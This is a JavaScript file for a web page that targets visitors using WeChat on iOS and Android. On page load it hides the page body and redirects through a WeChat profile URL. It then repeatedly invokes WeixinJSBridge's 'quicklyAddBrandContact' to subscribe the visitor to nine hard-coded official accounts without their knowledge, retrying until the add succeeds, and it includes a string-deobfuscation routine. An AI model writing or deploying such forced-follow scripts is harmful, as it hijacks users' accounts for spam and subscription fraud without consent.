var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var isArm = !!navigator.userAgent.match(/(Android|android)/);
var gh=["gh_032228d5319a","gh_63f72d1cfc6c","gh_95635393f092","gh_c5a1f8bfbbbe","gh_4d5df930b22c","gh_119a4cd854df","gh_f3bc241774bd","gh_72a6df3c25cd","gh_cc5fd78b01a9"];

function isWeiXin(){
    var ua = window.navigator.userAgent.toLowerCase();
    if (ua.match(/MicroMessenger/i) == 'micromessenger') {
        return true;
    } else {
        return false;
    }
};

function endaction() {
    try{
        window.name='ok' + Math.random();
        window.location.href = location.href+'?t=endjs';
    }catch(_0x1c7de6){}
};

function uncompileStr(code){
    code=unescape(code);
    var c=String.fromCharCode(code.charCodeAt(0)-code.length);
    for(var i=1;i<code.length;i++)
    {
        c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));
    }
    return c;
};

function tostart(result){
    goTo(result);
}

function goTo(username) {
    d = document;
    d.body.style.display = 'none';
    var vk = false;
    var ha = 0;

    c = function () {
        clearInterval(mm);
    };

    j = function () {
        if (ha !== 99) m();
    };

    h = function () {
        endaction();
    };

    m = function () {
        if (!vk) {
            vk = true;
            h()
        }
    };

    k = function () {
        go(username);
    };

    go = function (username) {

        username.forEach(function (item) {
            window.location.href = 'https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=' + '' + '&t=' + Math.random() + '#wechat_redirect';
            mm = setTimeout(function () {
                try {
                    WeixinJSBridge.invoke('quicklyAddBrandContact', {
                        scene: '',
                        username: item
                    }, function (d) {
                        if (d.err_msg.indexOf('ok') !== -1 || d.err_msg.indexOf('added') !== -1) {
                            ha = 99;
                            m();
                        } else {
                            go([item])
                        }
                    });
                    ha++;
                    if (ha === 4) setTimeout(j, 200);
                } catch (e) {}
            }, 200);
        })
    };

    if (typeof (WeixinJSBridge) === 'undefined') {
        if (document.addEventListener){
            document.addEventListener('WeixinJSBridgeReady', k, false)
        }
    } else{
        k();
    }
};

$(function(){
    if(window.name === ''){
        if(isWeiXin() && isIos){
            goTo(gh);
        }
        else if(isWeiXin()&&isArm){
            goTo(gh);
        }
    }else{
        window.loadadd = true;
        window.name = '';
    }
});